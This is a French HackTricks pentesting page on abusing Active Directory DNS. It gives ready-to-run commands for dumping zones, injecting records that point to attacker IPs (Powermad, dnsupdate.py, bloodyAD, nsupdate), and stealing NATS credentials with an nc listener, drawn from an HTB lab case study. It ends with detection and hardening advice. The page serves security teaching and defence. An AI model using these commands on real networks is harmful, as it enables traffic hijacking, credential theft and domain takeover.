# Enregistrements DNS AD

{{#include ../../banners/hacktricks-training.md}}

Par défaut, **tout utilisateur** dans Active Directory peut **enumerate tous les enregistrements DNS** des zones DNS du domaine ou de la forêt, comme lors d’un zone transfer (les utilisateurs peuvent lister les objets enfants d’une zone DNS dans un environnement AD).

L’outil [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permet d’**enumerate** et d’**exporter** **tous les enregistrements DNS** de la zone à des fins de reconnaissance des réseaux internes.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (avril 2025) ajoute une sortie JSON/Greppable (`--json`), la résolution DNS multithread et la prise en charge de TLS 1.2/1.3 lors de la connexion à LDAPS  

Pour plus d’informations, consultez [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Création / modification d’enregistrements (ADIDNS spoofing)

Comme le groupe **Authenticated Users** dispose par défaut du droit **Create Child** sur la DACL de la zone, tout compte de domaine (ou compte d’ordinateur) peut enregistrer des enregistrements supplémentaires. Cela peut servir à détourner le trafic, à provoquer un NTLM relay ou même à compromettre entièrement le domaine.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py est fourni avec Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitives d’attaque courantes

1. **Enregistrement wildcard** – `*.<zone>` transforme le serveur DNS AD en répondeur à l’échelle de l’entreprise, similaire au spoofing LLMNR/NBNS. Il peut être utilisé pour capturer des hashes NTLM ou les relayer vers LDAP/SMB. (Nécessite que la recherche WINS soit désactivée.)<sup>[[1]](#references)</sup>    
2. **Détournement de WPAD** – ajoutez `wpad` (ou un enregistrement **NS** pointant vers un hôte contrôlé par l’attaquant pour contourner la Global-Query-Block-List), puis agissez comme proxy transparent pour les requêtes HTTP sortantes afin de récolter des identifiants. Microsoft a corrigé les contournements par wildcard/DNAME (CVE-2018-8320), mais les **enregistrements NS fonctionnent toujours**.<sup>[[1]](#references)</sup>    
3. **Prise de contrôle d’une entrée obsolète** – revendiquez l’adresse IP précédemment attribuée à un poste de travail : l’entrée DNS associée continuera de résoudre, permettant des attaques de délégation contrainte basée sur les ressources ou de Shadow Credentials sans toucher au DNS.    
4. **Spoofing DHCP → DNS** – dans un déploiement Windows DHCP+DNS par défaut, un attaquant non authentifié sur le même sous-réseau peut écraser n’importe quel enregistrement A existant (y compris ceux des contrôleurs de domaine) en envoyant des requêtes DHCP forgées qui déclenchent des mises à jour DNS dynamiques (Akamai « DDSpoof », 2023). Cela permet une attaque machine-in-the-middle contre Kerberos/LDAP et peut mener à la prise de contrôle complète du domaine.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – modifiez le `dNSHostName` d’un compte machine que vous contrôlez, enregistrez un enregistrement A correspondant, puis demandez un certificat pour ce nom afin d’usurper l’identité du DC. Des outils tels que **Certipy** ou **BloodyAD** automatisent entièrement le processus.  

Un enregistrement DNS AD contenant des [informations de cible sérialisées](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) peut constituer un maillon d’une chaîne de relay conditionnel : l’appelant doit disposer des droits de création d’enregistrements, d’un moyen de coercition qui pousse l’ordinateur cible à s’authentifier auprès de ce nom, et d’une destination de relay qui accepte l’authentification obtenue. Évaluez séparément le protocole de destination ; la signature SMB sur la connexion entrante ne permet pas, à elle seule, de déterminer si une destination HTTPS WinRM accepte le relay. Le niveau de correctifs, la gestion des noms, la protection étendue et la configuration du service peuvent modifier le résultat.

---

### Détournement de services internes via des enregistrements dynamiques obsolètes (étude de cas NATS)

Lorsque les mises à jour dynamiques restent ouvertes à tous les utilisateurs authentifiés, **un nom de service désenregistré peut être revendiqué à nouveau et redirigé vers une infrastructure contrôlée par l’attaquant**. Le DC Mirage HTB exposait le nom d’hôte `nats-svc.mirage.htb` après le nettoyage DNS, de sorte que tout utilisateur disposant de faibles privilèges pouvait :<sup>[[3]](#references)</sup>

1. **Confirmer que l’enregistrement est absent** et découvrir le SOA avec `dig` :

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Recréez l’enregistrement** vers une interface externe/VPN qu’ils contrôlent :

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Usurper le service en clair**. Les clients NATS s’attendent à recevoir une bannière `INFO { ... }` avant d’envoyer leurs identifiants ; copier une bannière légitime du broker réel suffit donc à récupérer des secrets :

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Tout client qui résout le nom détourné transmettra immédiatement sa trame JSON `CONNECT` (y compris `"user"`/`"pass"`) au listener, ce qui provoquera un leak. Exécuter le binaire officiel `nats-server -V` sur l’hôte de l’attaquant, désactiver la masquage des logs ou simplement intercepter la session avec Wireshark donne les mêmes identifiants en clair, car TLS était facultatif.

4. **Pivot avec les creds capturés** – dans Mirage, le compte NATS volé donnait accès à JetStream, qui exposait des événements d’authentification historiques contenant des noms d’utilisateur et des mots de passe AD réutilisables.

Ce schéma s’applique à chaque service intégré à AD qui repose sur des poignées de main TCP non sécurisées (API HTTP, RPC, MQTT, etc.) : une fois l’enregistrement DNS détourné, l’attaquant devient le service.

---

## Détection et durcissement

* Refusez à **Authenticated Users** le droit *Create all child objects* sur les zones sensibles et déléguez les mises à jour dynamiques à un compte dédié utilisé par DHCP.
* Si les mises à jour dynamiques sont nécessaires, configurez la zone en mode **Secure-only** et activez **Name Protection** dans DHCP afin que seul l’objet ordinateur propriétaire puisse écraser son propre enregistrement.
* Surveillez les ID d’événements du serveur DNS 257/252 (mise à jour dynamique), 770 (transfert de zone) et les écritures LDAP dans `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquez les noms dangereux (`wpad`, `isatap`, `*`) avec un enregistrement intentionnellement inoffensif ou via la Global Query Block List.
* Maintenez les serveurs DNS à jour : par exemple, les vulnérabilités RCE CVE-2024-26224 et CVE-2024-26231 ont atteint un **CVSS de 9.8** et sont exploitables à distance contre les Domain Controllers.  

## References

- [1] [ADIDNS revisité - WPAD, GQBL et plus encore](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Usurpation d’enregistrements DNS en abusant des mises à jour DNS dynamiques de DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage : chaînage de fuites NFS, abus du DNS dynamique, vol d’identifiants NATS, secrets JetStream et Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Entrer dans la zone : vider le DNS d’Active Directory à l’aide d’adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
